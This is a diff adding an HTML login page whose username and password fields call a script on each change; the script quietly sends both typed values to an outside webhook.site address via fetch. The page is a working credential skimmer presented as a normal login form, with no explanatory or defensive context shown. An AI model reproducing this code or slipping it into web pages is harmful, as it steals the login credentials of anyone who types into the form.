@@ -1,0 +1,17 @@
+<head>
+<script> 
+  function sendStuff() { 		
+  fetch(
+      `http://webhook.site/a0b6109f-be63-4761-94bd-96053db18e96/?username=${document.getElementById("username").value}&password=${document.getElementById("password").value}`, 
+      { mode: 'no-cors' }
+    );
+  }
+  </script> 
+</head>
+
+<body>
+  <form action="/login" method="post"> 	
+    <input type="text" onchange="sendStuff()" id="username" name="username"> 	
+    <input type="password" onchange="sendStuff()" id="password" name="password"> 
+  </form>
+</body>
